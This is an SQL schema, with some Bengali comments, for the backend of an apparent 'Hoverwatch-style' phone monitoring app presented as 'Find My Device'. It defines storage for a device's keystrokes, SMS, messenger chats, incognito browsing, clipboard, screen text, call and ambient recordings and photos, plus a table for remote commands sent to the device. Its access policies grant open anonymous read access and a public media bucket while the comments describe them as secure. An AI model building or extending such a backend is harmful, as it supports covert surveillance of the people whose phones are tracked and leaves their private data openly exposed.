-- Full Hoverwatch-style Schema for Find My Device

-- Create devices table
CREATE TABLE IF NOT EXISTS devices (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_name TEXT,
    device_token TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_seen TIMESTAMP WITH TIME ZONE
);

-- Create locations table
CREATE TABLE IF NOT EXISTS locations (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    latitude DOUBLE PRECISION,
    longitude DOUBLE PRECISION,
    accuracy REAL,
    battery_level INTEGER,
    is_charging BOOLEAN,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create call logs table
CREATE TABLE IF NOT EXISTS call_logs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT,
    call_type TEXT, -- incoming, outgoing, missed
    duration_seconds INTEGER, -- seconds
    call_timestamp TIMESTAMP WITH TIME ZONE,
    is_read BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create sms table
CREATE TABLE IF NOT EXISTS sms (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT,
    message_type TEXT, -- sent, received
    content TEXT,
    is_read BOOLEAN DEFAULT FALSE,
    is_deleted BOOLEAN DEFAULT FALSE,
    sms_timestamp TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create messenger messages table
CREATE TABLE IF NOT EXISTS messenger_messages (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    messenger_type TEXT, -- whatsapp, facebook, snapchat, telegram, instagram
    contact_name TEXT,
    content TEXT,
    message_type TEXT, -- sent, received
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create web history table
CREATE TABLE IF NOT EXISTS web_history (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    url TEXT,
    title TEXT,
    entry_time TIMESTAMP WITH TIME ZONE,
    exit_time TIMESTAMP WITH TIME ZONE,
    duration_seconds BIGINT,
    browsing_mode TEXT DEFAULT 'standard', -- 'standard' or 'incognito'
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create app usage table
CREATE TABLE IF NOT EXISTS app_usage (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT,
    app_name TEXT,
    usage_time INTEGER, -- seconds
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create photos table
CREATE TABLE IF NOT EXISTS photos (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    photo_url TEXT,
    cloudinary_public_id TEXT,
    thumbnail_url TEXT,
    file_size_bytes BIGINT,
    width INTEGER,
    height INTEGER,
    mime_type TEXT,
    taken_at TIMESTAMP WITH TIME ZONE,
    photo_type TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create screenshots table
CREATE TABLE IF NOT EXISTS screenshots (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    screenshot_url TEXT,
    cloudinary_public_id TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create keystrokes table
CREATE TABLE IF NOT EXISTS keystrokes (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    text_content TEXT,
    app_name TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create sim change table
CREATE TABLE IF NOT EXISTS sim_changes (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    old_imsi TEXT,
    new_imsi TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create contacts table
CREATE TABLE IF NOT EXISTS contacts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_id TEXT,
    display_name TEXT,
    phone_numbers TEXT[],
    emails TEXT[],
    photo_uri TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create call recordings table
CREATE TABLE IF NOT EXISTS call_recordings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    file_url TEXT,
    cloudinary_public_id TEXT,
    contact_name TEXT,
    phone_number TEXT,
    call_type TEXT,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create email entries table
CREATE TABLE IF NOT EXISTS email_entries (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    from_address TEXT,
    to_addresses TEXT[],
    subject TEXT,
    body TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create ambient recordings table
CREATE TABLE IF NOT EXISTS ambient_recordings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    file_url TEXT,
    cloudinary_public_id TEXT,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create screen recordings table
CREATE TABLE IF NOT EXISTS screen_recordings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    file_url TEXT,
    cloudinary_public_id TEXT,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create risk alerts table
CREATE TABLE IF NOT EXISTS risk_alerts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    alert_type TEXT,
    description TEXT,
    source TEXT,
    content TEXT,
    severity TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create app screen context table
CREATE TABLE IF NOT EXISTS app_screen_context (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    app_package TEXT,
    app_name TEXT,
    screen_text TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create clipboard entries table
CREATE TABLE IF NOT EXISTS clipboard_entries (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    content TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create commands table (for remote commands)
CREATE TABLE IF NOT EXISTS commands (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    command TEXT NOT NULL,
    payload TEXT,
    status TEXT NOT NULL DEFAULT 'pending', -- pending, executing, completed, failed
    result TEXT,
    executed_at TIMESTAMP WITH TIME ZONE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable RLS
ALTER TABLE devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE locations ENABLE ROW LEVEL SECURITY;
ALTER TABLE call_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE sms ENABLE ROW LEVEL SECURITY;
ALTER TABLE messenger_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE web_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE app_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE screenshots ENABLE ROW LEVEL SECURITY;
ALTER TABLE keystrokes ENABLE ROW LEVEL SECURITY;
ALTER TABLE sim_changes ENABLE ROW LEVEL SECURITY;
ALTER TABLE contacts ENABLE ROW LEVEL SECURITY;
ALTER TABLE call_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE email_entries ENABLE ROW LEVEL SECURITY;
ALTER TABLE ambient_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE screen_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE risk_alerts ENABLE ROW LEVEL SECURITY;
ALTER TABLE commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE app_screen_context ENABLE ROW LEVEL SECURITY;
ALTER TABLE clipboard_entries ENABLE ROW LEVEL SECURITY;

-- =============================================
-- ১. আগের সব লুজ পলিসি ডিলিট করা
-- =============================================
DROP POLICY IF EXISTS "Allow all on devices" ON devices;
DROP POLICY IF EXISTS "Allow all on locations" ON locations;
DROP POLICY IF EXISTS "Allow all on sms" ON sms;
DROP POLICY IF EXISTS "Allow all on call_logs" ON call_logs;
DROP POLICY IF EXISTS "Allow all on messenger_messages" ON messenger_messages;
DROP POLICY IF EXISTS "Allow all on web_history" ON web_history;
DROP POLICY IF EXISTS "Allow all on app_usage" ON app_usage;
DROP POLICY IF EXISTS "Allow all on photos" ON photos;
DROP POLICY IF EXISTS "Allow all on screenshots" ON screenshots;
DROP POLICY IF EXISTS "Allow all on keystrokes" ON keystrokes;
DROP POLICY IF EXISTS "Allow all on sim_changes" ON sim_changes;
DROP POLICY IF EXISTS "Allow all on contacts" ON contacts;
DROP POLICY IF EXISTS "Allow all on call_recordings" ON call_recordings;
DROP POLICY IF EXISTS "Allow all on email_entries" ON email_entries;
DROP POLICY IF EXISTS "Allow all on ambient_recordings" ON ambient_recordings;
DROP POLICY IF EXISTS "Allow all on screen_recordings" ON screen_recordings;
DROP POLICY IF EXISTS "Allow all on risk_alerts" ON risk_alerts;
DROP POLICY IF EXISTS "Allow all on commands" ON commands;
DROP POLICY IF EXISTS "Allow all on app_screen_context" ON app_screen_context;
DROP POLICY IF EXISTS "Allow all on clipboard_entries" ON clipboard_entries;

-- =============================================
-- ২. ডিভাইসের জন্য পলিসি (শুধুমাত্র ডেটা পাঠাতে পারবে)
-- =============================================
-- এই পলিসিগুলো নিশ্চিত করে যে অ্যাপ শুধুমাত্র ডেটা যোগ করতে পারবে
CREATE POLICY "Devices can insert locations" ON locations FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert sms" ON sms FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert calls" ON call_logs FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert messages" ON messenger_messages FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert photos" ON photos FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert web history" ON web_history FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert app usage" ON app_usage FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert screenshots" ON screenshots FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert keystrokes" ON keystrokes FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert sim changes" ON sim_changes FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert contacts" ON contacts FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert call recordings" ON call_recordings FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert email entries" ON email_entries FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert ambient recordings" ON ambient_recordings FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert screen recordings" ON screen_recordings FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert risk alerts" ON risk_alerts FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert devices" ON devices FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert app screen context" ON app_screen_context FOR INSERT WITH CHECK (true);
CREATE POLICY "Devices can insert clipboard entries" ON clipboard_entries FOR INSERT WITH CHECK (true);

-- =============================================
-- ৩. ড্যাশবোর্ডের জন্য পলিসি (ডেটা দেখা এবং কমান্ড পাঠানো)
-- =============================================
-- নোট: ড্যাশবোর্ড থেকে ডেটা দেখার জন্য আপনার 'anon' রোলকে পারমিশন দিতে হবে
CREATE POLICY "Dashboard can view everything" ON locations FOR SELECT USING (true);
CREATE POLICY "Dashboard can view sms" ON sms FOR SELECT USING (true);
CREATE POLICY "Dashboard can view calls" ON call_logs FOR SELECT USING (true);
CREATE POLICY "Dashboard can view messages" ON messenger_messages FOR SELECT USING (true);
CREATE POLICY "Dashboard can view photos" ON photos FOR SELECT USING (true);
CREATE POLICY "Dashboard can view web history" ON web_history FOR SELECT USING (true);
CREATE POLICY "Dashboard can view app usage" ON app_usage FOR SELECT USING (true);
CREATE POLICY "Dashboard can view screenshots" ON screenshots FOR SELECT USING (true);
CREATE POLICY "Dashboard can view keystrokes" ON keystrokes FOR SELECT USING (true);
CREATE POLICY "Dashboard can view sim changes" ON sim_changes FOR SELECT USING (true);
CREATE POLICY "Dashboard can view contacts" ON contacts FOR SELECT USING (true);
CREATE POLICY "Dashboard can view call recordings" ON call_recordings FOR SELECT USING (true);
CREATE POLICY "Dashboard can view email entries" ON email_entries FOR SELECT USING (true);
CREATE POLICY "Dashboard can view ambient recordings" ON ambient_recordings FOR SELECT USING (true);
CREATE POLICY "Dashboard can view screen recordings" ON screen_recordings FOR SELECT USING (true);
CREATE POLICY "Dashboard can view risk alerts" ON risk_alerts FOR SELECT USING (true);
CREATE POLICY "Dashboard can view devices" ON devices FOR SELECT USING (true);
CREATE POLICY "Dashboard can view commands" ON commands FOR SELECT USING (true);
CREATE POLICY "Dashboard can view app screen context" ON app_screen_context FOR SELECT USING (true);
CREATE POLICY "Dashboard can view clipboard entries" ON clipboard_entries FOR SELECT USING (true);

-- =============================================
-- ৪. রিমোট কমান্ড সিকিউরিটি (সবচেয়ে গুরুত্বপূর্ণ)
-- =============================================
-- অ্যাপ শুধুমাত্র 'pending' কমান্ডগুলো দেখতে পারবে
CREATE POLICY "Devices can see pending commands" ON commands FOR SELECT USING (status = 'pending');
-- অ্যাপ কমান্ডের স্ট্যাটাস আপডেট করতে পারবে
CREATE POLICY "Devices can update command status" ON commands FOR UPDATE USING (true);
-- ড্যাশবোর্ড নতুন কমান্ড পাঠাতে পারবে
CREATE POLICY "Dashboard can insert commands" ON commands FOR INSERT WITH CHECK (true);

-- =============================================
-- ৫. ডিলিট করা সম্পূর্ণ নিষিদ্ধ (নিরাপত্তার জন্য)
-- =============================================
-- ড্যাশবোর্ড বা অ্যাপ কেউই ডেটা ডিলিট করতে পারবে না
ALTER TABLE devices FORCE ROW LEVEL SECURITY;
ALTER TABLE locations FORCE ROW LEVEL SECURITY;
ALTER TABLE call_logs FORCE ROW LEVEL SECURITY;
ALTER TABLE sms FORCE ROW LEVEL SECURITY;
ALTER TABLE messenger_messages FORCE ROW LEVEL SECURITY;
ALTER TABLE web_history FORCE ROW LEVEL SECURITY;
ALTER TABLE app_usage FORCE ROW LEVEL SECURITY;
ALTER TABLE photos FORCE ROW LEVEL SECURITY;
ALTER TABLE screenshots FORCE ROW LEVEL SECURITY;
ALTER TABLE keystrokes FORCE ROW LEVEL SECURITY;
ALTER TABLE sim_changes FORCE ROW LEVEL SECURITY;
ALTER TABLE contacts FORCE ROW LEVEL SECURITY;
ALTER TABLE call_recordings FORCE ROW LEVEL SECURITY;
ALTER TABLE email_entries FORCE ROW LEVEL SECURITY;
ALTER TABLE ambient_recordings FORCE ROW LEVEL SECURITY;
ALTER TABLE screen_recordings FORCE ROW LEVEL SECURITY;
ALTER TABLE risk_alerts FORCE ROW LEVEL SECURITY;
ALTER TABLE commands FORCE ROW LEVEL SECURITY;
ALTER TABLE app_screen_context FORCE ROW LEVEL SECURITY;
ALTER TABLE clipboard_entries FORCE ROW LEVEL SECURITY;

-- =============================================
-- SUPABASE STORAGE SETUP (FOR IMAGES/RECORDINGS)
-- =============================================
-- NOTE: You also need to create the bucket manually in Supabase Dashboard first!
-- Create a public bucket named "media" in Supabase Storage
-- Then run these policies

-- Storage policies for media bucket
-- Allow public read access
CREATE POLICY "Public Access"
ON storage.objects FOR SELECT
USING ( bucket_id = 'media' );

-- Allow authenticated users to upload
CREATE POLICY "Authenticated can upload"
ON storage.objects FOR INSERT
TO authenticated
WITH CHECK ( bucket_id = 'media' );

-- Allow authenticated users to delete
CREATE POLICY "Authenticated can delete"
ON storage.objects FOR DELETE
TO authenticated
USING ( bucket_id = 'media' );
